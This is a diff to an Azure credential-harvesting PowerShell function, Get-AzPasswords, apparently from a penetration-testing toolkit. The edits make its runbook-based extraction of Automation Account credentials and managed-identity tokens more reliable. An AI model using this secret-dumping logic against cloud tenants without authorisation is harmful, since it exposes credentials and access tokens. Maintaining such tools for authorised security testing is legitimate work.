@@ -168,7 +168,7 @@ Function Get-AzPasswords
         # List subscriptions, pipe out to gridview selection
         $Subscriptions = Get-AzSubscription -WarningAction SilentlyContinue
         $subChoice = $Subscriptions | out-gridview -Title "Select One or More Subscriptions" -PassThru
-        foreach ($sub in $subChoice) {Get-AzPasswords -Subscription $sub -ExportCerts $ExportCerts -FunctionApps $FunctionApps -ExportKube $ExportKube -Keys $Keys -AppServices $AppServices -AutomationAccounts $AutomationAccounts -CertificatePassword $CertificatePassword -ACR $ACR -StorageAccounts $StorageAccounts -ModifyPolicies $ModifyPolicies -CosmosDB $CosmosDB -AKS $AKS -ContainerApps $ContainerApps -APIManagement $APIManagement -ServiceBus $ServiceBus -AppConfiguration $AppConfiguration -BatchAccounts $BatchAccounts}
+        foreach ($sub in $subChoice) {Get-AzPasswords -Subscription $sub -ExportCerts $ExportCerts -FunctionApps $FunctionApps -ExportKube $ExportKube -Keys $Keys -AppServices $AppServices -AutomationAccounts $AutomationAccounts -CertificatePassword $CertificatePassword -ACR $ACR -StorageAccounts $StorageAccounts -ModifyPolicies $ModifyPolicies -CosmosDB $CosmosDB -AKS $AKS -ContainerApps $ContainerApps -APIManagement $APIManagement -ServiceBus $ServiceBus -AppConfiguration $AppConfiguration -BatchAccounts $BatchAccounts -TestPane $TestPane}
         break
     }
 
@@ -598,6 +598,7 @@ Function Get-AzPasswords
                         "`$base64string = [Convert]::ToBase64String([IO.File]::ReadAllBytes(`$CertificatePath))" | Out-File -FilePath "$pwd\$jobName.ps1" -Append
 
                         # Copy the B64 encryption cert to the Automation Account host
+                        "New-Item -ItemType Directory -Force -Path `"C:\Temp`" | Out-Null" | Out-File -FilePath "$pwd\$jobName.ps1" -Append
                         "`$FileName = `"C:\Temp\microburst.cer`"" | Out-File -FilePath "$pwd\$jobName.ps1" -Append
                         "[IO.File]::WriteAllBytes(`$FileName, [Convert]::FromBase64String(`"$ENCbase64string`"))" | Out-File -FilePath "$pwd\$jobName.ps1" -Append
                         "Import-Certificate -FilePath `"c:\Temp\microburst.cer`" -CertStoreLocation `"Cert:\CurrentUser\My`" | Out-Null" | Out-File -FilePath "$pwd\$jobName.ps1" -Append
@@ -646,6 +647,7 @@ Function Get-AzPasswords
                         "`$password = `$myCredential.GetNetworkCredential().Password" | Out-File -FilePath "$pwd\$jobName2.ps1" -Append
 
                         # Copy the B64 encryption cert to the Automation Account host
+                        "New-Item -ItemType Directory -Force -Path `"C:\Temp`" | Out-Null" | Out-File -FilePath "$pwd\$jobName2.ps1" -Append
                         "`$FileName = `"C:\Temp\microburst.cer`"" | Out-File -FilePath "$pwd\$jobName2.ps1" -Append
                         "[IO.File]::WriteAllBytes(`$FileName, [Convert]::FromBase64String(`"$ENCbase64string`"))" | Out-File -FilePath "$pwd\$jobName2.ps1" -Append
                         "Import-Certificate -FilePath `"c:\Temp\microburst.cer`" -CertStoreLocation `"Cert:\CurrentUser\My`" | Out-Null" | Out-File -FilePath "$pwd\$jobName2.ps1" -Append
@@ -672,7 +674,8 @@ Function Get-AzPasswords
                     $dumpMI = $true
                     $dumpMiJobName = -join ((65..90) + (97..122) | Get-Random -Count 15 | % {[char]$_})
                     # Copy the B64 encryption cert to the Automation Account host
-                    "`$FileName = `"C:\Temp\microburst.cer`"" | Out-File -FilePath "$pwd\$dumpMiJobName.ps1"
+                    "New-Item -ItemType Directory -Force -Path `"C:\Temp`" | Out-Null" | Out-File -FilePath "$pwd\$dumpMiJobName.ps1"
+                    "`$FileName = `"C:\Temp\microburst.cer`"" | Out-File -Append -FilePath "$pwd\$dumpMiJobName.ps1"
                     "[IO.File]::WriteAllBytes(`$FileName, [Convert]::FromBase64String(`"$ENCbase64string`"))" | Out-File -FilePath "$pwd\$dumpMiJobName.ps1" -Append
                     "Import-Certificate -FilePath `"c:\Temp\microburst.cer`" -CertStoreLocation `"Cert:\CurrentUser\My`" | Out-Null" | Out-File -FilePath "$pwd\$dumpMiJobName.ps1" -Append
                     #Request a token from the IMDS
@@ -828,6 +831,9 @@ Function Get-AzPasswords
                                 
                                             # Might be able to delete this line...
                                             if($jobOutput[0] -like "Credentials asset not found*"){$jobOutput[0] = "Not Created"; $jobOutput[1] = "Not Created"}
+
+                                            # Select only lines containing the protected content (skip eventual debug output)
+                                            $jobOutput = $jobOutput | Where-Object { $_.value -match "-----BEGIN CMS-----" }
         
                                             # Decrypt the output and add it to the table
                                             $cred1 = ($jobOutput[0].value | Unprotect-CmsMessage)
